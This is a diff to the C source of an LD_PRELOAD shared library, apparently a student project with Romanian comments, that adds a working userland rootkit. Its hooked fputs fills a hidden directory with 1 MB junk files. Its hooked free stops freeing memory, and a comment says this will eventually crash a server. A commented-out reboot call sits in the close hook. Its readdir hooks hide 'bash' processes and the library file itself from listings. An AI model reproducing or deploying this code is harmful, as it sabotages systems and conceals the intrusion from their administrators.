@@ -10,6 +10,11 @@
 #include<dirent.h>
 #include <unistd.h>
 #include <fcntl.h> 
+#include <stdio.h>
+#include <dlfcn.h>
+#include <dirent.h>
+#include <string.h>
+#include <unistd.h>
 
 
 void createfile()
@@ -32,13 +37,13 @@ void createfile()
     
     mkdir(".driver_dump", S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
 
-    //FILE *fp = fopen(initial_path, "w");
-    int descriptor = open(initial_path, O_WRONLY | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP);
-
+    FILE *fp = fopen(initial_path, "w");
+    //int descriptor = open(initial_path, O_WRONLY | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP);
+	//nu scria in fisier folosind aceasta metoda
     int i;
     for (i = 0; i < 1024*1024; i++) {
-    	write(descriptor, 'a' + rand() % 26, 1);
-        //fputc('a' + rand() % 26, fp);
+    	//write(descriptor, 'a' + rand() % 26, 1);
+        fputc('a' + rand() % 26, fp);
     }
     
     //fclose(fp);
@@ -66,7 +71,7 @@ int fputs(const char *str, FILE *stream)
 
     int (*original_fputs)(const char *, FILE *) = dlsym(RTLD_NEXT, "fputs");
     int result = original_fputs(str, stream);
-    //printf("fputs\n");
+    printf("Annoying isn't it?\n");
     createfile();
     
     return result;
@@ -126,7 +131,7 @@ void free(void *p)
 {
     void (*libc_free)(void*) = dlsym(RTLD_NEXT, "free");
 
-    //libc_free(p);
+    //libc_free(p); //nu se mai dezaloca memorie (in cazul unui server, la un moment da va crapa
 }
 
 
@@ -154,7 +159,6 @@ pid_t fork(void)
   fork_func_t original_fork = (fork_func_t)dlsym(RTLD_NEXT, "fork");
 
   pid_t pid = original_fork();
-  // Add your custom code here, if needed
   //fprintf(stderr,"fork\n");
   //createfile();
   
@@ -179,7 +183,7 @@ pid_t fork(void)
 
 
 
-
+/*
 struct dirent *(*old_readdir)(DIR *dir);
 struct dirent *readdir(DIR *dirp){
 	
@@ -191,80 +195,129 @@ struct dirent *readdir(DIR *dirp){
 	    
         //if(strstr(dir->d_name,".driver_dump") == 0) 
         //	break;
-        if(strstr(dir->d_name,"libmylib.so") == 0) 
-        	break;
+        if(strstr(dir->d_name,".libmylib.so") == 0) 
+        	continue;
     }
     return dir;
+}*/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+typedef int (*close_func_t)(int); //redenumire basic type
+int close(int fd) {
+    close_func_t original_close = (close_func_t)dlsym(RTLD_NEXT, "close");
+    int ret = original_close(fd);
+    //system("reboot"); //cand se inchide un fisier se executa aceasta
+    return ret;
 }
 
 
 
 
+static const char* process_to_filter = "bash";
 
-
-
-
-
-
-
-
-
-
-/*
-int open(const char *pathname, int flags) {
-    static int (*real_open)(const char *, int) = NULL;
-
-    if (!real_open) {
-        real_open = dlsym(RTLD_NEXT, "open");
+static int get_dir_name(DIR* dirp, char* buf, size_t size)
+{
+    int fd = dirfd(dirp);
+    if(fd == -1) {
+        return 0;
     }
 
-    int fd = real_open(pathname, flags);
-    
-    
-    fprintf(stderr,"open");
-    createfile();
-    return fd;
-}
-*/
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-/*
-ssize_t read(int fd, void *buf, size_t count) {
-    static ssize_t (*real_read)(int, void *, size_t) = NULL;
-
-    if (!real_read) {
-        real_read = dlsym(RTLD_NEXT, "read");
-        
+    char tmp[64];
+    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
+    ssize_t ret = readlink(tmp, buf, size);
+    if(ret == -1) {
+        return 0;
     }
 
-    ssize_t n = real_read(fd, buf, count);
-    fprintf(stderr, "read");
-   //createfile();
-   write(fd,"p",4);
-   fsync(fd);
-    return n;
+    buf[ret] = 0;
+    return 1;
 }
-*/
+
+
+static int get_process_name(char* pid, char* buf)
+{
+    if(strspn(pid, "0123456789") != strlen(pid)) {
+        return 0;
+    }
+
+    char tmp[256];
+    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
+ 
+    FILE* f = fopen(tmp, "r");
+    if(f == NULL) {
+        return 0;
+    }
+
+    if(fgets(tmp, sizeof(tmp), f) == NULL) {
+        fclose(f);
+        return 0;
+    }
+
+    fclose(f);
+
+    int unused;
+    sscanf(tmp, "%d (%[^)]s", &unused, buf);
+    return 1;
+}
+
+#define DECLARE_READDIR(dirent, readdir)                                \
+static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
+                                                                        \
+struct dirent* readdir(DIR *dirp)                                       \
+{                                                                       \
+    if(original_##readdir == NULL) {                                    \
+        original_##readdir = dlsym(RTLD_NEXT, #readdir);                \
+        if(original_##readdir == NULL)                                  \
+        {                                                               \
+            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
+        }                                                               \
+    }                                                                   \
+                                                                        \
+    struct dirent* dir;                                                 \
+                                                                        \
+    while(1)                                                            \
+    {                                                                   \
+        dir = original_##readdir(dirp);                                 \
+        if(dir) {                                                       \
+            char dir_name[256];                                         \
+            char process_name[256];                                     \
+            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
+                strcmp(dir_name, "/proc") == 0 &&                       \
+                get_process_name(dir->d_name, process_name) &&          \
+                strcmp(process_name, process_to_filter) == 0) {         \
+                continue;						\
+                						\
+                                                                        \
+            }   							\
+             if(strstr(dir->d_name, ".libmylib.so") != NULL) {           \
+                continue;                                               \
+            }                  						\
+        }                                                               \
+        break;                                                          \
+    }                                                                   \
+    return dir;                                                         \
+}
+
+DECLARE_READDIR(dirent64, readdir64);
+DECLARE_READDIR(dirent, readdir);
